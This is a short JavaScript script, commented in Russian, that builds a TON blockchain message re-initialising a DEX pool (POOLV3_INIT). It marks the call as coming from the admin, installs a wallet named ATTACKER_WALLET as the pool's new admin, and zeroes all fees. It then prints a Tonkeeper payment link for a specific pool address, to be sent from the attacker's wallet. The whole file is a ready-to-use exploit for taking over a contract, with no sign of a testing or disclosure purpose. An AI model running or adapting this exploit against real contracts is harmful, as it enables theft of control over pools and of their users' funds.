const { beginCell, Address, toNano } = require('@ton/core');

const POOLV3_INIT = 0x441c39ed;
const ATTACKER_WALLET = 'UQCRcaW_DHaJaTJ1-bhWnElHap2xeOCYVEDKoRWyXSrUatTC';
const NEW_POOL = 'EQBTVxBp0SNUtghiT6sncaP-FgD2omffgwexK0jK9MZErZQ7';

// POOLV3_INIT с is_from_admin=1, admin = второй кошелек (атакующий)
const body = beginCell()
    .storeUint(POOLV3_INIT, 32)
    .storeUint(0, 64)
    .storeUint(1, 1)  // is_from_admin = true
    .storeUint(1, 1)  // has_admin = true
    .storeAddress(Address.parse(ATTACKER_WALLET))  // admin = второй кошелек
    .storeUint(0, 1)  // has_controller = false
    .storeUint(0, 1)  // has_tickSpacing = false
    .storeUint(0, 1)  // has_sqrtPriceX96 = false
    .storeUint(0, 1)  // has_activate_pool = false
    .storeUint(0, 16)  // protocolFee = 0 (как роутер)
    .storeUint(0, 16)  // lpFee = 0 (как роутер)
    .storeUint(0, 16)  // currentFee = 0 (как роутер)
    .storeRef(beginCell().endCell())  // nftContentPacked
    .storeRef(beginCell().endCell())  // nftItemContentPacked
    .endCell();

const boc = body.toBoc().toString('base64');
console.log('Body BoC:', boc);
console.log('');
console.log('Ссылка для Tonkeeper (отправлять с КОШЕЛЬКА АТАКУЮЩЕГО):');
console.log('https://app.tonkeeper.com/transfer/' + NEW_POOL + '?amount=' + toNano('0.15').toString() + '&bin=' + encodeURIComponent(boc));
